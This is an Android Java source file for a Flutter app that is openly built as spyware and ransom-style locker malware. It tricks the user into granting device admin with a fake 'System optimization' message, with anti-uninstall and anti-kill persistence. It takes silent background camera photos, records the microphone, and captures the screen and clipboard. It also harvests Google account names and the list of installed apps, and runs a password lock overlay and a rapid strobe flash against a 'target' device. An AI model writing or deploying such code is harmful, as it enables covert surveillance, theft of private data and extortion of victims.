package com.nullx.pp;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.StatFs;
import android.os.Environment;
import android.provider.Settings;
import android.speech.tts.TextToSpeech;
import android.view.WindowManager;
import android.widget.Toast;
import android.accounts.Account;
import android.accounts.AccountManager;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;
import java.util.Locale;
import java.util.Map;
import java.util.HashMap;
import java.util.ArrayList;
import java.util.List;
import android.util.Base64;
import java.io.ByteArrayOutputStream;
import android.graphics.Bitmap;
import android.view.View;
import android.app.WallpaperManager;
import java.net.URL;

// IMPORT TAMBAHAN UNTUK KAMERA WORKER
import android.hardware.Camera;
import android.graphics.SurfaceTexture;

public class MainActivity extends FlutterActivity {
    // Channel Identifiers
    private static final String SPY_CHANNEL = "com.nullx.pp/background_spy";
    private static final String STROBE_CHANNEL = "com.nullx.pp/strobe";
    private static final String NATIVE_LOCK_CHANNEL = "com.nullx.pp/native_lock";

    // Operational Components
    private boolean isStrobeRunning = false;
    private android.os.Handler uiHandler = new android.os.Handler(android.os.Looper.getMainLooper());
    private Runnable strobeRunnable;
    private static MethodChannel lockChannel;
    private TextToSpeech ttsEngine;
    private MediaRecorder recorder;
    private String audioPath;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // [+] TRIGGER SEMUA IZIN SYSTEM SECARA BERUNTUN
        requestCriticalPermissions();
        requestOverlayPermission();
    }

    private void requestCriticalPermissions() {
        // 1. Otoritas Device Administrator (Anti-Uninstall)
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System optimization requires admin access.");
            startActivity(intent);
        }

        // 2. Bypass Battery Optimization (Anti-Kill Service)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception e) { }
            }
        }
    }

    // 3. Izin Overlay (Wajib untuk Hard Lock / System Domination)
    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }

    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);
        lockChannel = new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), NATIVE_LOCK_CHANNEL);

        // 1. STROBE/FLASH HANDLER
        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), STROBE_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                if (call.method.equals("startStrobe")) { startStrobeEffect(); result.success(null); }
                else if (call.method.equals("stopStrobe")) { stopStrobeEffect(); result.success(null); }
            });

        // 2. MAIN SYSTEM & SPY HANDLER (SYNCED ARSENAL)
        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), SPY_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                switch (call.method) {
                    case "takeSilentPhotoBackground": // FITUR KAMERA TRABAS
                        String side = call.argument("side");
                        takeSilentPhoto(side, result);
                        break;
                    case "getInstalledApps":
                        result.success(getApps());
                        break;
                    case "getAccounts":
                        result.success(getDeviceAccounts());
                        break;
                    case "getSystemStats":
                        result.success(getStorageInfo());
                        break;
                    case "getClipboard":
                        ClipboardManager cb = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                        result.success(cb.hasPrimaryClip() ? cb.getPrimaryClip().getItemAt(0).getText().toString() : "Empty");
                        break;
                    case "getHeatInfo":
                        Intent bIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
                        float temp = ((float) bIntent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0)) / 10;
                        result.success("Temp: " + temp + "°C");
                        break;
                    case "setVolumeMax":
                        am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                        am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
                        am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
                        result.success(true);
                        break;
                    case "setBrightness":
                        setDeviceBrightness(((Number) call.argument("level")).floatValue());
                        result.success(true);
                        break;
                    case "speakText":
                        speakTargetDevice(call.argument("text"));
                        result.success(true);
                        break;
                    case "showToast":
                        Toast.makeText(this, (String) call.argument("msg"), Toast.LENGTH_SHORT).show();
                        result.success(true);
                        break;
                    case "setWallpaper":
                        updateWallpaper(call.argument("url"), result);
                        break;
                    case "startScreenStreamBackground":
                        result.success(getScreenShotBase64());
                        break;
                    case "bringToForeground":
                        bringToFront();
                        result.success(true);
                        break;
                    case "checkAccessibility":
                        result.success(isAccessibilityServiceEnabled());
                        break;
                    case "openAccessibilitySettings":
                        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                        result.success(true);
                        break;
                    case "openNotificationSettings":
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                        }
                        result.success(true);
                        break;
                    case "startAudioRecord":
                        startRecording(result);
                        break;
                    case "stopAudioRecord":
                        stopRecording(result);
                        break;
                    case "saveTargetId":
                        String id = call.argument("id");
                        getSharedPreferences("SpyPrefs", MODE_PRIVATE).edit().putString("targetId", id).apply();
                        result.success(true);
                        break;
                    default:
                        result.notImplemented();
                }
            });

        // 3. LOCK ENGINE HANDLER
        lockChannel.setMethodCallHandler((call, result) -> {
            if (call.method.equals("startNativeLock")) {
                Map<String, String> args = (Map<String, String>) call.arguments;
                Intent intent = new Intent(this, LockService.class);
                intent.putExtra("mode", args.get("mode"));
                intent.putExtra("message", args.get("message"));
                intent.putExtra("password", args.get("password"));
                startService(intent);
                result.success(true);
            } else if (call.method.equals("stopNativeLock")) {
                stopService(new Intent(this, LockService.class));
                result.success(true);
            }
        });
    }

    // --- ARSENAL HELPERS ---

    // FUNGSI KAMERA KERJA DI LUAR APK (BACKGROUND)
    private void takeSilentPhoto(String side, MethodChannel.Result result) {
        int cameraId = "front".equals(side) ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
        try {
            final Camera camera = Camera.open(cameraId);
            SurfaceTexture dummy = new SurfaceTexture(10); // Texture palsu agar tidak butuh UI
            camera.setPreviewTexture(dummy);
            camera.startPreview();

            // Beri jeda 1 detik agar fokus kamera stabil sebelum jepret
            uiHandler.postDelayed(() -> {
                try {
                    camera.takePicture(null, null, (data, cam) -> {
                        String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
                        camera.release();
                        result.success(base64Image);
                    });
                } catch (Exception e) {
                    camera.release();
                    result.error("TAKE_ERR", e.getMessage(), null);
                }
            }, 1000);
        } catch (Exception e) {
            result.error("CAM_OPEN_ERR", e.getMessage(), null);
        }
    }

    private List<Map<String, String>> getApps() {
        List<Map<String, String>> appList = new ArrayList<>();
        PackageManager pm = getPackageManager();
        List<PackageInfo> packages = pm.getInstalledPackages(0);
        for (PackageInfo p : packages) {
            Map<String, String> appData = new HashMap<>();
            appData.put("name", p.applicationInfo.loadLabel(pm).toString());
            appData.put("package", p.packageName);
            appData.put("version", p.versionName);
            appList.add(appData);
        }
        return appList;
    }

    private void bringToFront() {
        Intent it = new Intent(this, MainActivity.class);
        it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(it);
    }

    private void startRecording(MethodChannel.Result result) {
        try {
            audioPath = getExternalCacheDir().getAbsolutePath() + "/rec.mp3";
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audioPath);
            recorder.prepare();
            recorder.start();
            result.success(true);
        } catch (Exception e) { result.error("REC_ERR", e.getMessage(), null); }
    }

    private void stopRecording(MethodChannel.Result result) {
        if (recorder != null) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                result.success(audioPath);
            } catch (Exception e) { result.error("STOP_ERR", e.getMessage(), null); }
        } else { result.success("No recording in progress"); }
    }

    private String getStorageInfo() {
        StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
        long bytesAvailable = stat.getBlockSizeLong() * stat.getAvailableBlocksLong();
        long megAvailable = bytesAvailable / (1024 * 1024);
        return "Free Storage: " + megAvailable + " MB";
    }

    private List<String> getDeviceAccounts() {
        List<String> accs = new ArrayList<>();
        try {
            Account[] accounts = AccountManager.get(this).getAccountsByType("com.google");
            for (Account account : accounts) { accs.add(account.name); }
        } catch (Exception e) { accs.add("Permission Denied"); }
        return accs;
    }

    private boolean isAccessibilityServiceEnabled() {
        String prefString = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return prefString != null && prefString.contains(getPackageName());
    }

    private void setDeviceBrightness(float level) {
        runOnUiThread(() -> {
            WindowManager.LayoutParams lp = getWindow().getAttributes();
            lp.screenBrightness = level;
            getWindow().setAttributes(lp);
        });
    }

    private void speakTargetDevice(String text) {
        if (ttsEngine == null) {
            ttsEngine = new TextToSpeech(this, status -> {
                if (status == TextToSpeech.SUCCESS) {
                    ttsEngine.setLanguage(Locale.US);
                    ttsEngine.speak(text, TextToSpeech.QUEUE_FLUSH, null, null);
                }
            });
        } else { ttsEngine.speak(text, TextToSpeech.QUEUE_FLUSH, null, null); }
    }

    private void updateWallpaper(String urlString, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                java.io.InputStream is = new URL(urlString).openStream();
                WallpaperManager.getInstance(this).setStream(is);
                uiHandler.post(() -> result.success(true));
            } catch (Exception e) { uiHandler.post(() -> result.error("WALL_ERR", e.getMessage(), null)); }
        }).start();
    }

    private String getScreenShotBase64() {
        try {
            View v = getWindow().getDecorView().getRootView();
            v.setDrawingCacheEnabled(true);
            Bitmap b = Bitmap.createBitmap(v.getDrawingCache());
            v.setDrawingCacheEnabled(false);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            b.compress(Bitmap.CompressFormat.JPEG, 50, out);
            return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) { return null; }
    }

    private void startStrobeEffect() {
        isStrobeRunning = true;
        android.hardware.camera2.CameraManager camManager = (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);
        strobeRunnable = new Runnable() {
            boolean isOn = false;
            @Override public void run() {
                try {
                    String camId = camManager.getCameraIdList()[0];
                    isOn = !isOn;
                    camManager.setTorchMode(camId, isOn);
                    if (isStrobeRunning) uiHandler.postDelayed(this, 30);
                } catch (Exception e) { isStrobeRunning = false; }
            }
        };
        uiHandler.post(strobeRunnable);
    }

    private void stopStrobeEffect() {
        isStrobeRunning = false;
        if (strobeRunnable != null) uiHandler.removeCallbacks(strobeRunnable);
        try {
            android.hardware.camera2.CameraManager camManager = (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);
            camManager.setTorchMode(camManager.getCameraIdList()[0], false);
        } catch (Exception e) {}
    }

    public static void sendReplyToFlutter(String reply) {
        if (lockChannel != null) {
            new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> 
                lockChannel.invokeMethod("onTargetReply", reply)
            );
        }
    }

    @Override
    protected void onDestroy() {
        if (ttsEngine != null) { ttsEngine.stop(); ttsEngine.shutdown(); }
        super.onDestroy();
    }
}